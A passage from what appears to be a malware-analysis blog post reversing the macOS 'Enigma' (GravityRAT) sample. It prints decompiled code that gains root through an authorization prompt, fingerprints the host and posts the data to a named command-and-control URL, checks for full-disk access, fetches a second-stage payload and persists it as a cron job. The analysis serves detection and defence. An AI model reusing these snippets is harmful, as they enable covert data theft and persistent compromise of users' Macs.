</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#66d9ef">set</span> logFile <span style="color:#66d9ef">to</span> dirPath <span style="color:#f92672">&amp;</span> <span style="color:#e6db74">&#34;tmp0.txt&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span><span style="color:#66d9ef">set</span> theText <span style="color:#66d9ef">to</span> read logFile
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>do shell script theText <span style="color:#f92672">&amp;</span> <span style="color:#e6db74">&#34; &gt; /dev/null 2&gt;&amp;1 &amp;&#34;</span> <span style="color:#66d9ef">with</span> administrator privileges</span></span></code></pre></div>
<p>Easy to see it&rsquo;s simply attempting to execute the file (specified within <code>tmp0.txt</code>) with administrator privileges. Recall that in the <code>IsAuth</code> function (in the compiled Python code), the malware wrote out the path to itself into the <code>tmp0.txt</code> file:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;"><div style="font-size: 13px;">
# FileMonitor.app/Contents/MacOS/FileMonitor -pretty -filter tmp0.txt 
{
  "event" : "ES_EVENT_TYPE_NOTIFY_OPEN",
  "file" : {
    "destination" : "/private/var/folders/49/2gkt10ss7fj1zfr4l0rj4t5m0000gn/T/tmp0.txt",
    "process" : {
      "uid" : 501,
      "path" : "/private/var/folders/49/2gkt10ss7fj1zfr4l0rj4t5m0000gn/T/_MEIuEZp9g/Enigma.app/Contents/MacOS/applet",
      "pid" : 1567
      ...
    }
  }
}

$ cat /private/var/folders/49/2gkt10ss7fj1zfr4l0rj4t5m0000gn/T/tmp0.txt
/Users/user/Downloads/Enigma
</div></pre>
</div>
<p>&hellip;thus the AppleScript will prompt the user to authorize the (re)launching of the malware (<code>Enigma</code>) with elevated privileges:</p>
<img src="../images/blog/blog_0x5B/enigmaAuth.png"  width="66%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Authorization Prompt</center>

<p>Assuming the user enters their credentials into the authorization prompt, a second (privileged) instance of the malware will now be running (note: <code>uid: 0</code>):</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty
{
  "event" : "ES_EVENT_TYPE_NOTIFY_FORK",
  "process" : {
    <b>"uid" : 0,</b>
    "path" : "/Users/user/Downloads/Enigma",
    "pid" : 1742
  }
}
</pre>
</div>
<br>
<div class="note">
The malware authors could have avoided all this round about logic by simply invoking the <b>AuthorizationExecuteWithPrivileges</b> API. 🤷🏻‍♂️
</div>
<p>Now the malware is happily running as root. This means the <code>IsAuth</code> function will just return, which causes the malware to invoke a function named <code>IsAuthorize</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">IsAuthorize</span>():
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>        boM <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;ioreg -c IOPlatformExpertDevice -d 2 </span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>              <span style="color:#f92672">|</span> awk <span style="color:#f92672">-</span>F\\<span style="color:#e6db74">&#34; </span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">/product-name/{print $(NF-1)}</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#39;).read().strip()</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>        boP <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;ioreg -c IOPlatformExpertDevice -d 2 </span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>              <span style="color:#f92672">|</span> awk <span style="color:#f92672">-</span>F\\<span style="color:#e6db74">&#34; </span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">/board-id/{print $(NF-1)}</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#39;).read().strip()</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>        bM <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;ioreg -c IOPlatformExpertDevice -d 2 </span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>             <span style="color:#f92672">|</span> awk <span style="color:#f92672">-</span>F\\<span style="color:#e6db74">&#34; </span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">/manufacturer/{print $(NF-1)}</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#39;).read().strip()</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>        bP <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;ioreg -c IOPlatformExpertDevice -d 2 </span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>             <span style="color:#f92672">|</span> awk <span style="color:#f92672">-</span>F\\<span style="color:#e6db74">&#34; </span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">/model/{print $(NF-1)}</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#39;).read().strip()</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>        cu <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>        response <span style="color:#f92672">=</span> SSN<span style="color:#f92672">.</span>post(dURL, 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>                   data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;K&#39;</span>: <span style="color:#e6db74">&#39;vM&#39;</span>, <span style="color:#e6db74">&#39;cu&#39;</span>: cu, <span style="color:#e6db74">&#39;bM&#39;</span>: bM, <span style="color:#e6db74">&#39;bP&#39;</span>: bP, <span style="color:#e6db74">&#39;boM&#39;</span>: boM, <span style="color:#e6db74">&#39;boP&#39;</span>: boP})
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>        <span style="color:#66d9ef">return</span> response<span style="color:#f92672">.</span>text
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;-1&#39;</span></span></span></code></pre></div>
<p>This function gathers some basic information about its host (product name, board id, &amp; model), and sends it off to <code>https://download.enigma.net.in/90954349.php</code>.</p>
<p>If it receives a response (that is not <code>-V</code>) it attempts to list the files in <code>~/Library/Safari</code>. If this fails, it will prompt the user to (manually) give <code>Terminal.app</code> full-disk access:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">if</span> SID <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;-V&#39;</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>  <span style="color:#66d9ef">if</span> str(platform<span style="color:#f92672">.</span>release())<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&gt;=</span> <span style="color:#e6db74">&#39;18&#39;</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    krlck <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;ls ~/Library/Safari&#39;</span>)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    <span style="color:#66d9ef">if</span> krlck <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;&#39;</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>        app <span style="color:#f92672">=</span> MainWindow()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>        app<span style="color:#f92672">.</span>mainloop()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>        msgroot <span style="color:#f92672">=</span> tk<span style="color:#f92672">.</span>Tk()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>        msgroot<span style="color:#f92672">.</span>withdraw()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>        tkMessageBox<span style="color:#f92672">.</span>showerror(<span style="color:#e6db74">&#39;Enigma: Operation Not Permitted.&#39;</span>, <span style="color:#e6db74">&#39;Solution: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Go to System Preferences &gt; Security &amp; Privacy and give Full Disk Access to Terminal.app</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">(Applications &gt; Utilities&gt; Terminal.app)&#39;</span>)</span></span></code></pre></div>
<div class="note">
On recent version of macOS, application are barred from accessing many user and system files ...unless full-disk access has been granted by the user.  
<p>The ~/Library/Safari directory is example of a &ldquo;protected&rdquo; directory. Thus, this is how the malware is (indirectly) checking if it has full-disk access.</p>
</div>
<p>Assumming the user has granted <code>Terminal.app</code> and thus the malware (presumably running under <code>Terminal.app</code>) full-disk access, the malware shows the main UI window:</p>
<img src="../images/blog/blog_0x5B/enigma.png"  width="80%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Main Application Window</center>

<p>&hellip;the majority of the remaining (compiled) Python code in the malware seems to be &ldquo;legitimate&rdquo; &hellip;and ensures the UI interface performs as expected (so the user remains oblivious to the fact that the application is indeed malicious).</p>
<p>However, there is still (a bit) more malicious logic.</p>
<p>The Kaspersky <a href="https://securelist.com/gravityrat-the-spy-returns/99097/">report</a>, notes, &ldquo;<em>The Mac version &hellip;adds a cron job</em>&rdquo;</p>
<p>We find this persistence logic in a function named <code>format</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">format</span>(self, src, des, uc):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>  <span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>  <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isfile(des):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>      os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;cp &#39;</span> <span style="color:#f92672">+</span> src <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> des)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>  <span style="color:#66d9ef">if</span> des[<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>:] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;.py&#39;</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>      os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;sudo crontab -l 2&gt;/dev/null; </span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>                 echo <span style="color:#e6db74">&#34;*/2 * * * * python &#39; + des + &#39;&#34;</span> <span style="color:#f92672">|</span> sudo crontab <span style="color:#f92672">-</span><span style="color:#e6db74">&#39;)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>  <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>      os<span style="color:#f92672">.</span>chmod(des, <span style="color:#ae81ff">448</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>      des <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> uc
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>      os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;sudo crontab -l 2&gt;/dev/null; </span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>                 echo <span style="color:#e6db74">&#34;*/2 * * * * &#39; + des + &#39;&#34;</span> <span style="color:#f92672">|</span> sudo crontab <span style="color:#f92672">-</span><span style="color:#e6db74">&#39;)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>  <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;+O &#39;</span></span></span></code></pre></div>
<p>Via <code>crontab</code> the malware persists a (passed) file, as a cronjob &hellip;set to run every two minutes (<code>*/2 * * * *</code>).</p>
<p>The <code>format</code> is invoked by a function named <code>sptoken</code>.
Before invoking the <code>format</code> function, code within <code>sptoken</code> downloads the contents of the item to persist (as a cronjob):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sptoken</span>(self, clist, tokens, sndr, recvr):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>  rsp <span style="color:#f92672">=</span> SSN<span style="color:#f92672">.</span>get(id[<span style="color:#e6db74">&#39;O&#39;</span>])
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>  <span style="color:#66d9ef">if</span> rsp<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>      rep <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;+L &#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>      <span style="color:#66d9ef">with</span> open(Tp, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> (i):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>          i<span style="color:#f92672">.</span>write(rsp<span style="color:#f92672">.</span>content)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>      rep <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;+M &#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>      rep_temp <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>template(Tp, Lp)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>      rep <span style="color:#f92672">+=</span> rep_temp
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>      <span style="color:#66d9ef">if</span> rep_temp[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;+&#39;</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>          rep <span style="color:#f92672">+=</span> self<span style="color:#f92672">.</span>format(Tp, Lp, id[<span style="color:#e6db74">&#39;U&#39;</span>])</span></span></code></pre></div>
<p>&hellip;unfortunately this downloaded (and persisted) payload was not available for analysis 😞 As such, this wraps up our analysis.</p>
<h3 id="conclusions">Conclusions</h3>
<p>In this blog post, we thoroughly reversed the <code>Enigma</code> binary (<code>sha1: 086b22075d464b327a2bcbf8b66736560a215347</code>). After extracting its compiled Python, Mach-O &amp; AppleScript components, we analyzed each to gain an understandings of their capabilities.</p>
<p>And although we do not have access to the 2<sup>nd</sup>-stage payload, <a href="https://objective-see.com/products/blockblock.html">BlockBlock</a> will readily detect its (cronjob) persistence:</p>
<img src="../images/blog/blog_0x5B/blockblock.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">BlockBlock ...block, blocking!</center>

<br>
<h3 id="-support-us">💕 Support Us:</h3>
<div style="border: 1px solid #DCDCDC; border-radius:7px; padding: 10px; margin-top:15px; margin-bottom: 15px;">
    <center>Love these blog posts? You can support them via my <a href="https://www.patreon.com/bePatron?c=701171" class="inlineLink">Patreon</a> page!
    <br><br>
    <a href="https://www.patreon.com/bePatron?c=701171" style="text-decoration: none;">
      <img src="../images/patreon.png" style="display:block;margin:auto; padding-top:0px; width:100%"/>
    </a>
    </center>
</div>
</section>

    </div>

    
<script src="/js/cookies.js"></script>
<script src="/social/ss-social.js"></script>
<link href="/social/ss-social.css" rel="stylesheet" />

<script> 
    $(function(){
        
        
        
        if("" == getCookie("acceptedCookies")) 
        {
            console.log('ok showing!')

            document.getElementById("cookies").style.display = "block";
        }

    });
</script>

<script>
function acceptCookies() {

    
    setCookie("acceptedCookies", "yes", 365);

    
    document.getElementById("cookies").style.display = "none";
}
</script>

<br>
<br>
<div id="cookies" class="cookie" style="padding-left:20px;">
    This website uses cookies to improve your experience.
    <div class="cookieButton">
        
        <button class="menuicon button-4" role="button" onclick="acceptCookies()" style="margin-top: 12px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Okay!</button>
    </div>
</div>
<nav role="footer">
<ul>

    <li>
        <a href="mailto:contact@objective-see.com" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#x2709;</span></a>
    </li>

     <li>
        <a href="rss.xml" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xE310;</span></a>
    </li>

    <li>
        <a href="https://www.youtube.com/channel/UCQycc8VDhHuNkZlKSSTDHzw" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xF630;</span></a>
    </li>
   
    <li>
        <a href="https://twitter.com/objective_see" class="menubutton icon"><span class="ss-icon">&#xF611;</span></a>
    </li>
    
    <li>
         <form action="support.html" style="display: inline;">
            <button class="menuicon button-4" role="button" style="margin-top: 7px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Support Us!</button>
        </form>
        
    </li>

    <li>
        <div style="margin-top: 10px;">
        Signup for our <a class="inlineLink" target="_blank" href="http://eepurl.com/bXpXeT">newsletter </a> »
        </div>
    </li>

</ul>
</nav>

  </body>
</html>